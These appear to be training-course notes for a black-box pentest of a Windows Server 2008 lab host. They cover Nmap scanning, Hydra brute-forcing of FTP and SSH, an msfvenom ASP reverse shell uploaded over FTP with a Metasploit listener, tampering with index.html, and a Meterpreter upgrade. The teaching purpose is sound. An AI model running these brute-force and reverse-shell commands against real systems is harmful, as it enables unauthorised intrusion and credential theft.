# Windows Exploitation

## Windows Black Box Penetration Test

- A Black box pentest is a security assessment whereby the pentester is not provided with any information regarding the target system or network.
- The objective ob a Black Box pentest is to accurately test the security of a system or network as an external unprivileged adversary.
- This approach is very useful as it demonstrates how an external attacker with no inside knowledge would compromise a company's systems or networks

The following diagram outlines the various phases involved in a typical penetration test.

**Black Box Methodology**
- Host discovery
- Port scanning & enumeration
- Vulnerability detection/scanning
- Exploitation
  - Manual
  - Automated
- Post Exploitation
  - Privilege Escalation
  - Persistence
  - Dumping Hashes

![grafik](https://github.com/user-attachments/assets/5b4d241f-399d-4d20-b1eb-887ba43bb3a9)

### Scenario & Scope

- We just began our first job as Junior Pentester and have been assigned to assist in performing a pentest on a client's network.
- The pentest lead has assigned us to gain access/exploit a host running Windows Server 2008.
- Our primary objectives are:
  - Identify services running on the target
  - Identify vulnerabilites within the service
  - Exploit these vulnerabilities to obtain an initial foothold
 
# Port Scanning & Enumeration (Demo)

## Overview

- **Port Scanning & Enumeration**: These are fundamental steps in the information-gathering phase of penetration testing. We use tools like **Nmap** and **Netcat** to identify open ports and services, gather information about the target system, and enumerate potential vulnerabilities.
- **Goal**: In this demo, we will perform a port scan using **Nmap**, enumerate services running on the target system, and import the results into **Metasploit** for further analysis.

## Demo: Port Scanning & Enumeration

### Step-by-Step Process

### Step 1: View and Set Up the Hosts File

First, we check the contents of the **/etc/hosts** file to see if any relevant entries for the target system exist:

```bash
cat /etc/hosts
```

### Step 2: Create a Directory for Scan Results

Navigate to the **Desktop** and create a new directory for the target system (Windows Server 2008 in this case):

```bash
cd Desktop
mkdir Win2k8
cd Win2k8
```

### Step 3: Initial Nmap Scan

Perform an initial service version detection scan with **Nmap** on the target system:

```bash
nmap -sV demo.ine.local
```

### Step 4: Detailed Nmap Scan

Run a more comprehensive **Nmap** scan to detect services on a wider range of ports (1-10000). This scan will include service version detection and script scanning and will save the results in XML format:

```bash
nmap -T4 -PA -sC -sV -p 1-10000 demo.ine.local -oX nmap_10k
```

- **-T4**: Aggressive timing for faster scans.
- **-PA**: Send TCP ACK packets to discover hosts.
- **-sC**: Run default Nmap scripts.
- **-sV**: Detect service versions.
- **-p 1-10000**: Scan ports 1 through 10000.
- **-oX**: Output the scan results in XML format (for later import into Metasploit).

### Step 5: Access Web Services

While the **Nmap** scan is running, we attempt to manually check the target's web services via a browser. 

- Enumerate port **4848** by entering `http://demo.ine.local:4848` in the browser.
- Check port **8080** as well. Note that it might not have an SSL certificate.

### Step 6: Banner Grabbing with Netcat

We use **Netcat** to perform banner grabbing on the FTP port (port 21) to gather information about the service running there:

```bash
nc -nv demo.ine.local 21
```

### Step 7: Analyzing Nmap Results

Once the **Nmap** scan is complete, review the results to gather important information such as open ports, service versions, and possible vulnerabilities.

### Step 8: Importing Nmap Results into Metasploit

Start **PostgreSQL** and launch **Metasploit** to analyze the **Nmap** results:

```bash
service postgresql start && msfconsole
```

Create a new **workspace** in Metasploit for the target system:

```bash
workspace -a Win_2k9
```

Import the **Nmap** scan results into **Metasploit**:

```bash
db_import /root/Desktop/Win2k8/nmap_10k
```

### Step 9: Enumerating Hosts and Services in Metasploit

After importing the results, list the discovered hosts:

```bash
hosts
```

List the discovered services:

```bash
services
```

### Step 10: Verifying Hostname with SMB Version Scan

To ensure the hostname is displayed correctly, we run a **Metasploit auxiliary module** to gather **SMB version** information:

Search for the **SMB version scanner** module:

```bash
search smb_version
```

Use the module:

```bash
use auxiliary/scanner/smb/smb_version
```

View the module options:

```bash
show options
```

Set the target IP address or hostname:

```bash
set rhosts demo.ine.local
```

Run the module:

```bash
run
```

### Step 11: Verifying Hostname Information

After running the SMB scan, verify the host details:

```bash
hosts
```

### Conclusion

What we accomplished:
- Performed initial and detailed port scans using **Nmap**.
- Manually checked open ports and services via a web browser and performed banner grabbing with **Netcat**.
- Imported the **Nmap** scan results into **Metasploit** for further analysis.
- Used a **Metasploit auxiliary module** to verify the hostname and SMB version on the target system.

This demo shows the complete process of **port scanning** and **service enumeration**, helping us gather the necessary information for further exploitation.

# Targeting Microsoft IIS (FTP Exploitation Demo)

## Overview

- **Microsoft FTP**: Part of the Internet Information Services (IIS) package, Microsoft's FTP server allows file transfers and modifications, including the ability to change website files if properly accessed.
- **Goal**: In this demo, we will target the FTP service on a Microsoft IIS server, attempt to log in anonymously, perform brute-force attacks to identify valid credentials, and potentially upload a malicious **.asp reverse shell** to gain access.

## Demo: Exploiting FTP on Microsoft IIS

### Step-by-Step Process

### Step 1: Checking for Anonymous FTP Login

First, we check if **anonymous login** is enabled on the FTP server. We can use **Nmap** scripts to automate this check.

List the available **Nmap** FTP scripts:

```bash
ls -al /usr/share/nmap/scripts/ | grep ftp-
```

Run an **Nmap** scan with the **ftp-anon** script to check for anonymous login:

```bash
nmap -sV -p 21 --script=ftp-anon demo.ine.local
```

### Step 2: Manual FTP Login Attempt

You can also manually attempt to connect to the FTP server using **FTP**:

```bash
ftp demo.ine.local 21
```

If anonymous login is enabled, you should be able to log in without credentials.

### Step 3: Brute-Forcing FTP Credentials with Hydra

Next, we attempt a brute-force attack to identify valid FTP credentials using **Hydra**.

Use the default Metasploit wordlists for both usernames and passwords:

```bash
Hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt demo.ine.local ftp
```

After running this, we identify potential credentials.

### Step 4: Targeting a Specific User (Vagrant)

We check if there's a user called **vagrant** by performing a more targeted brute-force attack:

```bash
Hydra -l vagrant -P /usr/share/wordlists/metasploit/unix_passwords.txt demo.ine.local ftp
```

If unsuccessful, we try with another wordlist:

```bash
Hydra -l vagrant -P /usr/share/wordlists/metasploit/unix_users.txt demo.ine.local ftp -I
```

Finally, we obtain valid credentials for the **vagrant** user.

### Step 5: Logging into the FTP Server

Using the obtained credentials, log into the FTP server:

```bash
ftp demo.ine.local 21
```

Once logged in, list the contents of the FTP server:

```ftp
ls
```

You can see available files and directories, which may include website files.

### Step 6: Uploading an ASP Reverse Shell

We notice that **IIS** is configured to handle **.asp files**, which means we can execute **ASP scripts**. We attempt to upload a **reverse shell** written in ASP using **Msfvenom**.

Generate the **ASP reverse shell** payload:

```bash
msfvenom -p windows/shell/reverse_tcp LHOST=[eth1] LPORT=1234 -f asp > shell.aspx
```

Now, upload the **ASP** payload to the FTP server:

```ftp
put shell.aspx
```

### Step 7: Setting Up a Listener with Metasploit

In another terminal, start **Metasploit** and set up a listener for the reverse shell:

```bash
msfconsole
```

Use the **multi/handler** module:

```bash
use multi/handler
```

Set the **payload** to match the reverse shell you created:

```bash
set payload windows/shell/reverse_tcp
```

Configure the **LHOST** and **LPORT** to match the ones used in the **Msfvenom** command:

```bash
set lhost eth1
set lport 1234
```

Run the listener:

```bash
run
```

### Step 8: Triggering the Reverse Shell

Attempt to execute the uploaded **shell.aspx** file via a web browser:

```
http://demo.ine.local/shell.aspx
```

If the reverse shell connects successfully, you should have a command shell on the target machine through **Metasploit**.

### Step 9: Modifying Website Files

If the reverse shell attempt fails, we can try a different approach by modifying existing website files. For example, we can download the **index.html** file, edit it, and then re-upload it.

First, download the **index.html** file from the FTP server:

```ftp
get index.html
```

Edit the file locally (e.g., add a malicious script):

```bash
cd /Desktop/Win2k8
vim index.html
```

Once the file is modified, upload it back to the server:

```ftp
put index.html
```

### Conclusion

What we accomplished:
- Checked for anonymous login on the **Microsoft FTP server**.
- Used **Hydra** to brute-force valid FTP credentials.
- Logged into the FTP server and examined the files available.
- Attempted to upload a malicious **ASP reverse shell** to the server.
- Used **Metasploit** to set up a listener and tried to execute the reverse shell.
- If the reverse shell failed, we modified website files by editing **index.html** and re-uploading it.

This demo illustrates the process of targeting an **IIS FTP server**, brute-forcing credentials, and attempting to gain remote access via a reverse shell.

# Targeting OpenSSH (Demo)

## Overview

- **OpenSSH**: OpenSSH is a widely used suite for secure network communication, typically utilized for remote administration through **SSH**. In this demo, we will target the **SSH service** running on the target machine, perform brute-force attacks to obtain credentials, and use **Metasploit** to upgrade access.
- **Goal**: Gain access to the target system via SSH, escalate privileges, and attempt to establish a **Meterpreter session**.

## Demo: Exploiting OpenSSH

### Step-by-Step Process

### Step 1: Initial Nmap Scan

First, we perform an **Nmap scan** to detect the SSH service and gather more information about the target system:

```bash
nmap -sV -sC -p 22 demo.ine.local
```

- **-sV**: Detect service version.
- **-sC**: Run default scripts.

### Step 2: Brute-Forcing SSH Credentials with Hydra

Next, we use **Hydra** to brute-force the SSH credentials, starting with the **vagrant** user:

```bash
hydra -l vagrant -P /usr/share/wordlists/metasploit/unix_users.txt demo.ine.local ssh
```

This reveals valid credentials for the **vagrant** user.

We can also brute-force other users, such as the **administrator** user:

```bash
hydra -l administrator -P /usr/share/wordlists/metasploit/unix_users.txt demo.ine.local ssh
```

### Step 3: Logging in via SSH

Using the credentials obtained from the **Hydra** brute-force attack, we log into the target system via **SSH**:

```bash
ssh vagrant@demo.ine.local
```

Once logged in, we can check the user's permissions and list the files:

```bash
ls -al
whoami
```

We also check if the user belongs to the **admin** group:

```bash
net localgroup admin
```

### Step 4: Establishing a Meterpreter Session

We now attempt to upgrade our access to a **Meterpreter session** using **Metasploit**.

Start **Metasploit**:

```bash
msfconsole
```

Search for the **SSH login** module:

```bash
search ssh_login
```

Use the appropriate **SSH login** module:

```bash
use 0
```

Set the username, password, and target IP address:

```bash
set username vagrant
set password vagrant
set rhosts demo.ine.local
```

Run the module:

```bash
run
```

Once the module runs successfully, you will have an active **Meterpreter session**. Check for active sessions:

```bash
sessions 1
```

Put the session in the background:

```bash
background
```

### Step 5: Upgrading the Shell to Meterpreter

Attempt to upgrade the session to a **Meterpreter** session:

```bash
sessions -u 1
```

If the upgrade doesn't work, we can generate a **Meterpreter payload** with **MSFVenom** and transfer it to the target via our **SSH access**.

### Step 6: Obtaining a Command Shell

Using **bash**, we obtain a standard shell:

```bash
bash
```

Check the privileges of the current user:

```bash
whoami priv
```

### Step 7: Privilege Escalation

At this stage, we could attempt to escalate privileges by **bypassing UAC (User Account Control)** to gain administrative rights on the target system.

### Conclusion

What we accomplished:
- Scanned the target system with **Nmap** to identify the running SSH service.
- Used **Hydra** to brute-force valid SSH credentials.
- Logged into the system via **SSH** and enumerated user permissions.
- Attempted to upgrade the session to **Meterpreter** using **Metasploit**.
- Considered using **MSFVenom** to generate a payload if upgrading the session failed.

This demo shows how to target **OpenSSH** running on a system, brute-force login credentials, and leverage **Metasploit** to gain more control over the system.

